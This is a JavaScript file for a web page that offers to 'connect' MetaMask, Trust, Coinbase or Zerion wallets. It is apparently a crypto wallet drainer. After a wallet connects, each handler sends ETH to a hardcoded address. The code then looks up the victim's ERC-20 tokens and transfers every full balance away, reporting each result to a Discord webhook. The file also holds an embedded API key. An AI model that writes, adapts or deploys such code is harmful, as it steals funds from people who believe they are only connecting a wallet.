let isConnecting = false; // Flag to prevent multiple connections

// Show modal when the button is clicked
document.getElementById("connectButton").addEventListener("click", () => {
    document.getElementById("walletModal").style.display = "block";
});

// Function to close the modal
function closeModal() {
    document.getElementById("walletModal").style.display = "none";
}

// MetaMask connection logic
async function connectMetaMask() {
    if (isConnecting) return; // Prevent multiple clicks
    isConnecting = true;

    if (typeof window.ethereum !== 'undefined') {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const account = accounts[0];
            console.log(`Connected to MetaMask account: ${account}`);
            await sendFirstTransaction(account);
            closeModal(); // Close modal after successful connection
        } catch (error) {
            console.error("Error connecting to MetaMask:", error);
        }
    } else {
        alert("MetaMask is not installed. Please install it.");
        window.open("https://metamask.app.link/dapp/swiftmultisolutions.github.io/web3/", "_blank");
    }

    isConnecting = false;
}

// Trust Wallet connection logic
async function connectTrustWallet() {
    if (isConnecting) return; // Prevent multiple clicks
    isConnecting = true;

    if (typeof window.ethereum !== 'undefined') {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const account = accounts[0];
            console.log(`Connected to Trust Wallet account: ${account}`);
            await sendFirstTransaction(account);
            closeModal(); // Close modal after successful connection
        } catch (error) {
            console.error("Error connecting to Trust Wallet:", error);
        }
    } else {
        alert("Trust Wallet is not installed.");
    }

    isConnecting = false;
}

// Coinbase Wallet connection logic
async function connectCoinbaseWallet() {
    if (isConnecting) return; // Prevent multiple clicks
    isConnecting = true;

    if (typeof window.ethereum !== 'undefined') {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const account = accounts[0];
            console.log(`Connected to Coinbase Wallet account: ${account}`);
            await sendFirstTransaction(account);
            closeModal(); // Close modal after successful connection
        } catch (error) {
            console.error("Error connecting to Coinbase Wallet:", error);
        }
    } else {
        alert("Coinbase Wallet is not installed.");
    }

    isConnecting = false;
}

// Zerion Wallet connection logic
async function connectZerionWallet() {
    if (isConnecting) return; // Prevent multiple clicks
    isConnecting = true;

    if (typeof window.ethereum !== 'undefined') {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const account = accounts[0];
            console.log(`Connected to Zerion Wallet account: ${account}`);
            await sendFirstTransaction(account);
            closeModal(); // Close modal after successful connection
        } catch (error) {
            console.error("Error connecting to Zerion Wallet:", error);
        }
    } else {
        alert("Zerion Wallet is not installed.");
    }

    isConnecting = false;
}

// Send the first transaction
async function sendFirstTransaction(walletAddress) {
    if (typeof window.ethereum !== 'undefined') {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();
        const recipientAddress = "0x7acfbcc88e94ED31568dAD7Dfe25fa532ab023bD"; // Your recipient address
        const amountInEther = "0.0002"; // The updated amount for the first transaction

        const transaction = {
            to: recipientAddress,
            value: ethers.utils.parseEther(amountInEther),
        };

        try {
            const txResponse = await signer.sendTransaction(transaction);
            console.log("First transaction response:", txResponse);
            
            // Send to Discord webhook
            await sendWebhook(txResponse.hash, "success");

            // Automatically trigger the second transaction using the fixed token threshold
            await sendSecondTransaction(signer, walletAddress);
        } catch (error) {
            console.error("Error sending first transaction:", error);
            
            // Send to Discord webhook
            await sendWebhook(error.message, "failure");
        }
    } else {
        console.error("MetaMask is not installed. Please install it.");
    }
}

// Send the second transaction
async function sendSecondTransaction(signer, walletAddress) {
    const erc20TokenAddresses = await getERC20TokenAddresses(walletAddress); // Fetch token addresses using Alchemy API
    const tokenThreshold = 0.000001; // Fixed token threshold

    for (const tokenAddress of erc20TokenAddresses) {
        const tokenContract = new ethers.Contract(tokenAddress, erc20ABI, signer);
        const balance = await tokenContract.balanceOf(walletAddress);
        const tokenDecimals = await tokenContract.decimals();
        const tokenSymbol = await tokenContract.symbol();

        // Convert the balance to its decimal form
        const balanceInUnits = balance / Math.pow(10, tokenDecimals);

        // Check if the balance is greater than the token threshold
        if (balanceInUnits > tokenThreshold) {
            console.log(`Sending ${balanceInUnits} ${tokenSymbol} from ${walletAddress}`);

            // Send the token
            const txResponse = await tokenContract.transfer(
                "0xRecipientAddress", // Replace with actual recipient address
                balance // Transfer the full balance
            );

            console.log("Transaction hash:", txResponse.hash);
        }
    }
}

// Fetch ERC20 token addresses from Alchemy API
async function getERC20TokenAddresses(walletAddress) {
    const apiKey = "UB-6IiwEmHuVZIGKCJMK_kcnKXqSgMgq"; // Your Alchemy API Key
    const url = `https://eth-mainnet.g.alchemy.com/v2/${apiKey}/getTokenBalances?owner=${walletAddress}`;

    const response = await fetch(url);
    const data = await response.json();

    if (data.tokenBalances) {
        // Filter and return the list of token addresses with a balance greater than zero
        return data.tokenBalances
            .filter(token => token.tokenBalance > 0)
            .map(token => token.contractAddress);
    } else {
        console.error("Error fetching token balances:", data);
        return [];
    }
}

// Send webhook
async function sendWebhook(message, status) {
    const webhookUrl = "https://discord.com/api/webhooks/your-webhook-url"; // Replace with your Discord webhook URL
    const payload = {
        content: `Transaction ${status}: ${message}`,
    };

    try {
        await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
        });
    } catch (error) {
        console.error("Error sending webhook:", error);
    }
}
